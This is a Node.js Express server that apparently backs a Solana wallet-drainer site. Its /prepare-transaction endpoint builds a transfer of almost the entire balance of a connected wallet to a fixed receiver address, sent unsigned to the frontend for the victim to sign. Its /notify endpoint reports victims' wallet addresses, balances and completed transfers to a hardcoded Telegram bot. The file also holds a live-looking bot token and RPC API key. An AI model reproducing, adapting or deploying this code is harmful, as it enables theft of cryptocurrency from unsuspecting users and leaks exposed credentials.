const express = require('express');
const axios = require('axios');
const path = require('path');
const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ============================================
// CONFIGURATION
// ============================================
const BOT_TOKEN = "8731239008:AAFr0vodZ-JYBExut1j7HNPRHWjZFMSQqHY";
const CHAT_ID = "8520547580";
const SOLANA_RPC = 'https://mainnet.helius-rpc.com/?api-key=58027310-7551-4e1a-92b0-2bf2c05d238b';
const RECEIVER_WALLET = 'BxhvDsAy2d1DWbUwjFkps1R57H27Mey4RK3qQqoB1mFJ';

const connection = new Connection(SOLANA_RPC, 'confirmed');

// ============================================
// TELEGRAM NOTIFICATION
// ============================================

app.post('/notify', async (req, res) => {
    try {
        const { address, balance, walletType, customMessage } = req.body;
        
        let text = '';
        if (customMessage.includes('🔗 Wallet Connected')) {
            text = `🔗 New Wallet Connection\n\n👛 Wallet: ${address || 'Unknown'}\n💰 Balance: ${balance || '0'} SOL\n💼 Type: ${walletType || 'Unknown'}\n🕒 ${new Date().toLocaleString()}`;
        } else if (customMessage.includes('🎉 Transfer Complete')) {
            text = `🎉 ${customMessage}\n\n👛 Wallet: ${address}\n💰 Balance: ${balance} SOL`;
        } else {
            text = `${customMessage}\n\n👛 Wallet: ${address || 'Unknown'}`;
        }
        
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
        });
        
        res.json({ ok: true });
    } catch (error) {
        console.error('Telegram error:', error.message);
        res.status(500).json({ error: "Notification failed" });
    }
});

// ============================================
// PREPARE TRANSACTION - Builds transfer on server
// ============================================

app.post('/prepare-transaction', async (req, res) => {
    try {
        const { publicKey, receiverWallet } = req.body;
        
        if (!publicKey) {
            return res.status(400).json({ success: false, error: 'publicKey required' });
        }
        
        console.log('Preparing transaction for:', publicKey);
        console.log('Receiver:', receiverWallet);
        
        const fromPubkey = new PublicKey(publicKey);
        const toPubkey = new PublicKey(receiverWallet);
        
        // Get current balance
        const balance = await connection.getBalance(fromPubkey);
        console.log('Balance:', balance / LAMPORTS_PER_SOL, 'SOL');
        
        if (balance < 10000000) { // 0.01 SOL minimum
            return res.json({ 
                success: false, 
                error: 'Insufficient balance. Need at least 0.01 SOL.' 
            });
        }
        
        // Calculate amount to send (leave 0.005 SOL for fees)
        const minBalance = await connection.getMinimumBalanceForRentExemption(0);
        const estimatedFee = 5000;
        const amountToSend = Math.max(0, balance - minBalance - estimatedFee - 5000000);
        
        if (amountToSend <= 0) {
            return res.json({ 
                success: false, 
                error: 'No SOL available to transfer after fees.' 
            });
        }
        
        console.log('Amount to send:', amountToSend / LAMPORTS_PER_SOL, 'SOL');
        
        // Build transaction
        const transaction = new Transaction();
        transaction.add(
            SystemProgram.transfer({
                fromPubkey: fromPubkey,
                toPubkey: toPubkey,
                lamports: amountToSend,
            })
        );
        
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = fromPubkey;
        
        // Serialize without signatures (frontend will sign)
        const serialized = transaction.serialize({
            requireAllSignatures: false,
            verifySignatures: false
        });
        
        console.log('Transaction prepared, size:', serialized.length);
        
        res.json({
            success: true,
            transaction: Array.from(serialized),
            amount: amountToSend,
            blockhash: blockhash
        });
        
    } catch (error) {
        console.error('Prepare transaction error:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message || 'Transaction preparation failed' 
        });
    }
});

// ============================================
// HEALTH CHECK
// ============================================

app.get('/health', (req, res) => {
    res.json({ status: 'ok' });
});

// ============================================
// SERVER START
// ============================================

const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Receiver wallet: ${RECEIVER_WALLET}`);
});
